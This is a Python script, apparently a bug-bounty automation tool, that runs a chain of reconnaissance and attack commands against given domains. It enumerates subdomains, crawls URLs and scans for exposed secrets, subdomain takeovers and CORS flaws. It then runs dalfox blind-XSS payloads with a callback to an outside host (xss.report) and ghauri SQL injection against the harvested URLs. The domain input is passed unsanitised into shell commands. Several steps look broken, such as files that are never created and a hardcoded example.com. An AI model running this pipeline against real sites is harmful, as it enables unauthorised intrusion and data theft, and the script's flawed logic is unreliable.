import argparse
import subprocess
import sys
import os

def run_command(command, output_file=None):
    """
    Run a shell command and print its output to stdout and optionally to a file.
    """
    try:
        print(f"Running: {command}")
        result = subprocess.run(command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Print output to stdout
        if result.stdout:
            print(result.stdout)
        if result.stderr:
            print(result.stderr)
        
        # Optionally write to a file
        if output_file:
            with open(output_file, "a") as f:
                f.write(result.stdout + "\n")
                f.write(result.stderr + "\n")
        
        return result.stdout.strip()
    except Exception as e:
        print(f"Error while running command: {e}")
        return None

def main():
    parser = argparse.ArgumentParser(description="Automatic Time Earner - aTearn.py")
    parser.add_argument("-d", "--domain", type=str, help="Input domain or file with domains")
    parser.add_argument("-t", "--timeout", type=int, default=30, help="Timeout for operations (default: 30 seconds)")
    parser.add_argument("-o", "--output", type=str, default="aTearn_output.txt", help="Output file to save results")
    args = parser.parse_args()

    # Check if input is from stdin
    if not sys.stdin.isatty():
        domains = sys.stdin.read().strip().split("\n")
        with open("stdin_domains.txt", "w") as f:
            f.write("\n".join(domains))
        args.domain = "stdin_domains.txt"

    if not args.domain:
        print("Error: You must provide a domain or domain list file!")
        sys.exit(1)

    # Workflow commands
    commands = [
        f"subfinder -dL {args.domain} -all -recursive -timeout {args.timeout} -t 200 -nW -exclude-sources digitorus > Subs.txt",
        f"assetfinder {args.domain} >> Subs.txt",
        "cat Subs.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt",
        "cat subdomains_alive.txt | gau | katana -u - -d 6 -f qurl -jc -xhr -kf -fx -fs dn -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg | sort -u > allurls.txt",
        "katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt",
        "subzy run --targets subdomains_alive.txt --concurrency 100 --hide_fails --verify_ssl",
        "arjun -i subdomains_alive.txt -t 20 -d 2 --headers 'Cookie: PHPSESSID=BugBounty-Hunter---[ DedCrowd ]'",
        "cat subdomains_alive.txt | gau | grep '.js' | httpx-toolkit -content-type | grep 'application/javascript' | awk '{print $1}' | nuclei -t /nuclei-templates/http/exposures/ -silent > secrets.txt",
        "cat subdomains_alive.txt | gau | grep '\\.js$' | httpx-toolkit -status-code -mc 200 -content-type | grep 'application/javascript'",
        "paramspider -l subdomains_alive.txt --stream | grep -Ev 'woff|css|js|png|svg|php|jpg' > params.txt",
        "cat allurls.txt effective-urls.txt params.txt | gf sqli | anew | uro | uniq > sqli.txt ; cat sqli.txt | wc -l",
        "cat allurls.txt effective-urls.txt params.txt | gf redirect | anew | uro | uniq > redirect.txt ; cat redirect.txt | wc -l",
        "cat allurls.txt effective-urls.txt params.txt | gf xss | anew | uro | uniq > xss.txt ; cat xss.txt | wc -l",
        "cat allurls.txt effective-urls.txt params.txt | gf ssrf | anew | uro | uniq > ssrf.txt ; cat ssrf.txt | wc -l",
        "cat allurls.txt effective-urls.txt params.txt | gf ssti | anew | uro | uniq > ssti.txt ; cat ssti.txt | wc -l",
        "cat allurls.txt effective-urls.txt params.txt | gf lfi | anew | uro | uniq > lfi.txt ; cat lfi.txt | wc -l",
        "cat -A * | gf xss | tee xss.txt ; cat xss.txt | dalfox pipe -b https://xss.report/c/binbash",
        "ghauri -m effective-urls.txt --batch --random-agent --level 1 | tee sqlmap.txt",
        "corscanner -i subdomains_alive.txt -v -t 100",
        "waymore -i example.com -mode U -oU result.txt"
    ]

    # Run commands
    for command in commands:
        run_command(command, args.output)

if __name__ == "__main__":
    main()

